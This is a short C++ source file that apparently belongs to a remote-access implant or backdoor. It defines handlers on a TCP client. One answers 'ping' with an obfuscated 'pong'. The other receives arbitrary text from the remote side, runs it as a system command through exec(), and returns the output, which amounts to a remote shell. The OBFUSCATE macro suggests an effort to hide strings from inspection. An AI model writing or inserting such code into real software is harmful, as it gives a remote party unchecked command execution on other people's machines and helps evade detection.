#include "commands.h"

void handle_ping_command(TCPClient client) {
    client.send_data(OBFUSCATE("pong"));
}

void handle_shell_command(TCPClient client) {
    auto data = client.receive();
    const auto output = exec(*data);
    client.send_data(output.c_str());
}